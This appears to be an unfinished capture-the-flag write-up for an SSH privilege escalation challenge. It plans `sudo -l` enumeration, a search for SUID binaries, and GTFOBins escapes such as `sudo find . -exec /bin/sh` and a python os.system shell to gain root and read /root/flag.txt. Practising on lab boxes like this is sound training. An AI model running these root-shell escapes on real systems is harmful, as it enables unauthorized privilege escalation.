# Read The Flag (SSH Privilege Escalation)

## Approach
Given direct SSH access to a box as a low-privilege user:

```
ssh -p 37900 ctf-player@xebec.cylabacademy.net
```

Hints:
1. "What is sudo?"
2. "How do you know what permission you have?"

Both hints point at enumerating `sudo` permissions rather than searching for a kernel
exploit or SUID binary first.

## Solution
Planned approach:

```bash
sudo -l          # list what ctf-player can run as root without a password
```

Whatever binary appears there gets looked up on **gtfobins.github.io** for the known
escape technique (e.g. `sudo find . -exec /bin/sh \; -quit`, `sudo python3 -c
'import os;os.system("/bin/sh")'`, etc.), then used to spawn a root shell and locate the
flag:

```bash
find / -iname "*flag*" 2>/dev/null
cat /root/flag.txt
```

Fallback if `sudo -l` shows nothing: check for SUID binaries owned by root:

```bash
find / -perm -4000 -user root 2>/dev/null
```

**Status: in progress** — instance access is time-limited (14 min window), haven't
recorded the actual `sudo -l` output / exploited binary yet.

## Flag
_TBD_

## Takeaway
On any privesc box, `sudo -l` is the very first command to run — it usually points straight at the intended path.
